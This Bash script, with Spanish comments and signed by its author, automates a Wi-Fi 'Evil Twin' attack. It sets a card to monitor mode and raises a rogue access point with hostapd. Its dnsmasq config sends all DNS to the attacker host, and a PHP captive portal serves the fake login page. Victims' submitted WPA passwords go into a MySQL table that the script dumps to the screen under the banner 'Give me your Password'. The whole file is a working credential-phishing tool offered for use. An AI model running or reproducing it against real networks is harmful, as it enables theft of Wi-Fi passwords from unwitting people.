#!/bin/bash
# Herramienta para crear un EvilTwin con portal captivo
# by SebastianV1nces

#Colores
verde="\e[0;32m\033[1m"
sincolor="\033[0m\e[0m"
rojo="\e[0;31m\033[1m"
azul="\e[0;34m\033[1m"
amarillo="\e[0;33m\033[1m"
morado="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
gris="\e[0;37m\033[1m"
negrita="\e[1m"

#Funcion de salir con CONTROL + C
trap ctrl_c INT
function ctrl_c(){
#	clean
	echo -e "\n${rojo}[*]${sincolor}${negrita}${rojo}  Saliendo del script ${sincolor}${rojo}[*]${sincolor}"
	if systemctl  is-active --quiet  mysql ; then
		echo -e "${negrita}¿Quieres guardar la base de datos?${sincolor}"
		echo -e "\t\n${rojo} 1)${sincolor}${negrita} Guardar${sincolor}"
		echo -e "\t\n${rojo} 2)${sincolor}${negrita} Eliminar${sincolor}"
		echo -ne "\n${negrita} Que quieres hacer >> ${sincolor} " && read opction
		case $opction in
		1)
		echo -e "\n${rojo} [*] Elegiste guardar la base de datos [*] ${sincolor}"
		;;
		2)
		echo -e "\n\t${rojo} [*] Elegiste eliminar la base de datos [*] ${sincolor}"
		mysql -u root -proot -e "use eviltwin; delete from wpa_keys;"
		;;
		*)
		clear
		echo -e "${negrita}Saliendo del script(base de datos guardada por defecto)${sincolor}"
		;;
		esac
	else
		echo ""
	fi
	ifconfig $nic down > /dev/null 2>&1
	airmon-ng stop $nic > /dev/null 2>&1
	iwconfig $nic mode Managed > /dev/null 2>&1
	ifconfig $nic up > /dev/null  2>&1
	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	service  mysql stop
	systemctl start NetworkManager > /dev/null
	cd ..
	rm hostapd.conf > /dev/null 2>&1
	rm dnsmasq.conf > /dev/null 2>&1
	echo -e "\n${verde} Que tengas buen dia  :) ${sincolor}"
	exit 0
}

#modo monitor
function modeMonitor(){
	sleep 1
	clear
	echo -e ""
	echo -e "${rojo}  ╔═════════════════════════════════════════╗"
	echo -e "${rojo}  ║		                            ║${sincolor} "
	echo -e "${rojo}  ║${sincolor}${morado}[*]${verde} Modo monitor en tu tarjeta de red ${sincolor}${morado}[*]${sincolor}${rojo}║${sincolor}"
	echo -e "${rojo}  ║                                         ║${sincolor}"
	echo -e "${rojo}  ╚═════════════════════════════════════════╝${sincolor}"
	sleep 1.5
	echo -e "\n\t${negrita}+ Matando todas las conecciones${sincolor}\n"

	#Matando conecciones
	airmon-ng check kill > /dev/null 2>&1
	systemctl stop wpa_supplicant.service > /dev/null 2>&1
	sleep 1

	#interfaces
	contador=1
	for x in $(ifconfig -a | grep -o '^[a-zA-Z0-9]\+'); do
		echo -e "\t${rojo}$contador:${sincolor} ${negrita}$x${sincolor}\n"
		((contador++))
	done
	echo -ne "${morado}\t[*]${sincolor}${verde} ELije el nombre de tu NIC >> ${sincolor}" && read  nic

	#Activando modo monitor
	airmon-ng start $nic > /dev/null 2>&1
	sleep 1.5
	echo -e "${negrita}\n\t\t+  Iniciando modo monitor${sincolor}"

	#Verificando el modo monitor del nic
	verificNic=$(iwconfig $nic | grep "Mode" | awk '{print $4}' )
	case $verificNic in
	Mode:Monitor)
	sleep 1.5
	echo -e  "\n\t\t${negrita} + La interfaz ${rojo} $nic ${sincolor}${negrita}esta activa${sincolor}"
	sleep 1
	host
	;;
	*)
	echo -e "${rojo} No se pudo establecer el modo monitor ${sincolor}"
	ifconfig $nic down 2>/dev/null
	airmon-ng stop $nic 2>/dev/null
	iwconfig $nic mode Managed 2>/dev/null
	ifconfig $nic up 2>/dev/null
	systemctl start NetworkManager 2>/dev/null
	exit
	;;
	esac
}

#Archivo hostapd
function host(){
	clear
	echo -e "\n${rojo}  ╔═════════════════════════════════════╗"
        echo -e "${rojo}  ║                                     ║${sincolor} "
	echo -e "${rojo}  ║${sincolor}${morado}[*]${verde} Iniciando el hostpad por xterm${sincolor}${morado}[*]${sincolor}${rojo}║${sincolor}"
        echo -e "${rojo}  ║                                     ║${sincolor} "
	echo -e "${rojo}  ╚═════════════════════════════════════╝${sincolor}"
	echo -ne "${negrita}\n\t+ Nombre de la red: >> ${sincolor}" && read red
	echo -ne  "${negrita}\n\t+ Canal de la red: >> ${sincolor}"  && read canal

	cd archivos
	echo -e "interface=$nic" > hostapd.conf
	echo -e "driver=nl80211" >> hostapd.conf
	echo -e "ssid=$red" >> hostapd.conf
	echo -e "hw_mode=g" >> hostapd.conf
	echo -e "channel=$canal" >> hostapd.conf
	echo -e "macaddr_acl=0" >> hostapd.conf
	echo -e "auth_algs=1" >> hostapd.conf
	echo -e "ignore_broadcast_ssid=0" >> hostapd.conf

	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1

	chmod +x hostapd.conf
	xterm -geometry 60x20+900+450 -T "Point Access Hostapd" -e "hostapd hostapd.conf ; bash" &
	sleep 2.5
	table
}

#Creando tablas ip
function table(){
	ifconfig $nic up 192.168.1.1 netmask 255.255.255.0
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	clear
	dns
}

#Creando archivo dnsmasq
function dns(){
	echo -e "interface=$nic" > dnsmasq.conf
	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h" >> dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1" >> dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1" >> dnsmasq.conf
	echo -e "server=8.8.8.8" >> dnsmasq.conf
	echo -e "log-queries" >> dnsmasq.conf
	echo -e "log-dhcp" >> dnsmasq.conf
	echo -e "listen-address=127.0.0.1" >> dnsmasq.conf
	echo -e "address=/#/192.168.1.1" >> dnsmasq.conf
	sleep 1.5
	echo -e ""
	echo -e "${rojo}  ╔═════════════════════════════════════╗"
	echo -e "${rojo}  ║                                     ║ "
	echo -e "${rojo}  ║${sincolor}${morado}[*]${verde} Iniciando el dnsmasq por xterm${sincolor}${morado}[*]${sincolor}${rojo}║${sincolor}"
        echo -e "${rojo}  ║                                     ║${sincolor}"
	echo -e "${rojo}  ╚═════════════════════════════════════╝${sincolor}"
	sleep 1.5
	echo -e "\n\t${negrita} [+] Generando  archivo dnsmasq  jugando a las configuraciones \n\t      de red para el servidor dhcp${sincolor}"
	sleep 1.5
	echo  -e "\n\t${negrita} [+] Iniciando servidor PHP en xterm${sincolor}\n"

	#Ejecutando servicio
	killall network-manager dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	chmod +x dnsmasq.conf
	xterm -geometry 70x20+900+50 -T "DHCP" -e "dnsmasq -C dnsmasq.conf -d " &
	sleep 0.6
	cd portal
	xterm -geometry 70x20+450+450 -T "Server PHP" -e "php -S '192.168.1.1:80'" &
	service mysql start
	clear
	sql
}

function sql(){
	#variables para la base de datos
	usersql="root"
	password="root"
	dbname="eviltwin"
	tbl_name="wpa_keys"
	atributo1="password1"
	atributo2="password2"
	comando="CREATE DATABASE IF NOT EXISTS $dbname ; USE $dbname ; CREATE TABLE IF NOT EXISTS $tbl_name ($atributo1 varchar(20), $atributo2 varchar(20));"
	#creacion de la base de datos
	service mysql start
	mysql -u $usersql -p"$password" -e "$comando"
	#contraseñas en pantalla
	while true
	do
		echo -e "\n\t${rojo}${negrita}Contraseñas capturadas${sincolor}"
		echo -e "\t${negrita}Se reiniciara cada minuto${sincolor}\n"
		mysqldump -u root  -proot eviltwin wpa_keys > keys.txt
		cat keys.txt | grep -Ei "\('[^']+','[^']+'\)"
		 tput cnorm
		sleep 20 && clear
	done
}

#dependencias
function dependecias(){
	echo -e "${morado}[*]${sincolor}${negrita} Verificando dependencias${sincolor}${morado} [*]${sincolor}\n"
	sleep 1
	counter=0
	dependencias=(php dnsmasq hostapd mysql aircrack-ng xterm mysqldump)
	for programa in "${dependencias[@]}"; do
        if [ "$(command -v $programa)" ]; then
		sleep 1
                echo -e "${negrita}La dependencia ${verde}$programa${sincolor} esta instalada${sincolor}"
		let counter+=1
        else
                echo -e "${negrita}La dependecia ${rojo}$programa${sincolor} no esta instalada${sincolor}"
        fi
	done
	if [ "$(echo "$counter")" == "7" ]; then
		echo -e  "\n\t ${verde} Comenzando el script ${sincolor}"
	else
		echo -e "\n\t ${rojo} Instala las dependencias que te faltan ${sincolor}"
		exit 1
	fi
}

function banner(){
clear
echo -e "${negrita}${azul}.............."
echo            "..,;:ccc,. "
echo          "......''';lxO."
echo ".....''''..........,:ld;"
echo "           .';;;:::;,,.x,"
echo "      ..'''.            0Xxoc:,.  ..."
echo "  ....                ,ONkc;,;cokOdc',."
echo " .                   OMo           ':ddo."
echo "                    dMc               :OO;"
echo "                    0M.                 .:o."
echo "                    ;Wd"
echo "                    ;XO,"
echo "                       ,d0Odlc;,.."
echo "                           ..',;:cdOOd::,."
echo "                                    .:d;.':;."
echo "                                       'd,  .'"
echo "                                         ;l   .."
echo "                                          .o"
echo "                                            c"
echo "                                            .'"
echo -e "                                             .${sincolor}"
echo -e "\n\t${negrita}${azul}Give me your Password ${sincolor}"
echo -e "\n\t${verde} By SebastianV1nces ${sincolor}"
echo -e "\n${verde}Github: ${sincolor}${negrita}https://github.com/SebastianV1nces ${sincolor}"
echo -e "${verde}Instagran: ${sincolor}${negrita}https://www.instagram.com/SebastianV1nces${sincolor}\n" 
}

#por aqui este lado se inicia el script
#verificando si se ejecuta con el usuario root

if [ "$(id -u)" == "0" ]; then
	banner
	dependecias
	modeMonitor
else
        echo -e "${morado}[*]${sincolor}${negrita} Inicia como ${sincolor}${rojo}root${sincolor}${morado} [*]${sincolor}"
        exit 1
fi


